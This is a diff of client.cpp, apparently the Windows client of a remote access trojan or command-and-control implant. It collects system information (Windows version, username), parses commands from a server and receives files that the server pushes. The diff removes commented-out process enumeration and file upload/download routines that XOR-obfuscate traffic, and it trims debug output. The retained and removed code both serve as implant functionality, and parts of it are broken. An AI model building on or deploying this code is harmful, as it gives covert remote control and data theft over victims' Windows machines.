@@ -29,10 +29,6 @@ g++.exe -fdiagnostics-color=always -g client.cpp -o client.exe -lwsock32 -lrpcrt
 #include <iphlpapi.h>
 #include <string.h>
 #include <rpc.h>
-// newly added
-#include <tchar.h>
-#include <comdef.h>
-#include <locale>
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Wininet.lib")
 #pragma comment(lib, "IPHLPAPI.lib")
@@ -277,153 +273,7 @@ std::string getSysInfo() {
 		"WINDOWS VERSION:\n" + getWinVer() + "\n\n" +
 		"USERNAME:\n" + getUsername() + "\n";
 }
-/*
-std::string wcharToStdString(const WCHAR* w_str){
-	// figure out size required
-	int buffer_size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, nullptr, 0, nullptr, nullptr);
-	// make buffer of size
-	char * buffer = new char[buffer_size];
-	// convert to multibyte string
-	WideCharToMultiByte(CP_UTF8, 0, w_str, -1, buffer, buffer_size, nullptr, nullptr);
-	// make std::string to return with buffer info in it
-	std::string str(buffer);
 
-	delete[] buffer;
-
-	return str;
-}
-
-//get data from process and turn it into human readable/understandable information
-std::string listProcesses() {
-    std::string processList;
-	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	PROCESSENTRY32 pe32;
-	pe32.dwSize = sizeof(PROCESSENTRY32);
-
-    if (Process32First(hProcess, &pe32)) {
-		// add first process to the string list of processes
-        processList += wcharToStdString(pe32.szExeFile);
-		//add every string after it
-		while (Process32Next(hProcess, &pe32)) {
-			processList += "\n" + wcharToStdString(pe32.szExeFile);
-		}
-    }
-
-	printf("Enum Processes Success!"); //debug
-
-	CloseHandle(hProcess);
-	return processList;
-} */
-
-
-// Client handles download from server.
-/*
-void handle_download(SOCKET sock, const char* filepath) {
-	printf("In handle_download\n");
-
-	std::string filepathStr(filepath, strlen(filepath));
-	printf("filepathStr: %s\n", filepathStr);
-	
-	std::ifstream file(filepathStr, std::ios::binary); //Open the file
-	if (!file.is_open()) {
-		// download error handling
-		std::ostringstream oss;
-    	oss << "error creating file: " << filepathStr << "\n";
-    	std::string errMsg = oss.str();
-		sendMsg(errMsg, sock);
-	}
-
-	std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
-
-	sendMsg(fileContents, sock);
-
-	
-	// get file size
-	std::streamsize fileSize = file.tellg();
-	file.seekg(0, std::ios::beg);
-	std::string filesize = std::to_string(fileSize);
-
-	char* buffer = (char*)malloc(fileSize);
-	if (!file.read(buffer, fileSize)) {
-		file.close();
-		free(buffer);
-		return;
-	}
-
-	
-
-
-	char buf[DEFAULT_BUFLEN];
-	while (!file.eof()) {
-		file.read(buf, DEFAULT_BUFLEN);
-		int bytes_read = file.gcount();
-		if (bytes_read > 0) {
-			if (send(sock, xor_func(buf), bytes_read, 0) < 0) {
-				printf("Failed to send data");
-				return;
-			}
-		}
-	}
-
-	int filesize = 0;
-	int total_read = 0;
-	DWORD current_read_bytes = 0;
-	DWORD read_bytes = 0;
-
-	// read file size
-
-	HANDLE fhandle = CreateFileA((LPCSTR) path, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (fhandle == INVALID_HANDLE_VALUE) {
-		printf("CreateFileA error: %d\n", GetLastError());
-		exit(-1);
-	}
-
-	// get file size
-
-	filesize = GetFileSize(fhandle, NULL);
-	printf("filesize: %d\n", filesize); // Debug
-	if (filesize == INVALID_FILE_SIZE) {
-		printf("filesize error: %d\n", GetLastError());
-	}
-	// send file size
-	send(sock, (char *)&filesize, 4, 0);
-
-	while (total_read < filesize) {
-		if (!ReadFile(fhandle, buf, DEFAULT_BUFLEN, &read_bytes, NULL)) {
-			printf("ReadFile Error: %d", GetLastError());
-		}
-		total_read += read_bytes;
-		// xor data
-		xor_func(buf, read_bytes);
-		send(sock, buf, read_bytes, 0);
-	}
-	CloseHandle(fhandle);
-}
-
-// Client uploads to server.
-int handle_upload(int sock, const char* filename) {
-	char buf[DEFAULT_BUFLEN] = { 0 };
-	ofstream file(filename, ios::binary);
-	if (!file) {
-		printf("Failed to create file %s", filename); // debug
-		return 2;
-	}
-
-	int bytesRecvd = 0;
-	while ((bytesRecvd = recv(sock, buf, DEFAULT_BUFLEN, 0)) > 0) {
-		file.write(xor_func(buf), bytesRecvd);
-	}
-
-	if (bytesRecvd < 0) {
-		printf("File receive error"); // debug
-		return 1;
-	}
-
-	printf("File %s Received successfully", filename); // debug
-	file.close();
-	return 0;
-}
-*/
 // checks if user input is correct
 // returns an int specific to case number in main()
 int parseCmd(char cmd[]) {
@@ -592,7 +442,7 @@ int main() {
 			printf("filename: %s\n", filename); // debug
 			std::string filenameStr(filename, strlen(filename));
 
-			resMsg = filenameStr + " received.";
+			resMsg = filenameStr + " received.\n";
 			sendMsg(resMsg, sock);
 
 			// get length of data to come
@@ -603,15 +453,8 @@ int main() {
 			std::string lenStr(lenCStr, strlen(lenCStr));
 
 			std::istringstream iss(lenStr);
-			printf("before hex");
 			unsigned int dataLen = 0;
 			iss >> std::hex >> dataLen; // length of data to come
-			cout << "(dataLen) msg length(hex): " << dataLen << "\n"; // debug
-
-			// test which data len works
-			unsigned int receivedLen = std::strtoul(xor_func(recvbuf), NULL, 16);
-			printf("receivedLen msg length(hex): %d\n", receivedLen); // debug
-			size_t msgLen = static_cast<size_t>(receivedLen);
 			
 			// handle the upload from server
 			std::vector<char> databuf(DEFAULT_BUFLEN);
@@ -629,7 +472,7 @@ int main() {
 				dataLen -= bytesReceived;
 			}
 			file.close();
-			resMsg = "File recived successfully";
+			resMsg = "File received successfully\n";
 			sendMsg(resMsg, sock);
 		} break;
 
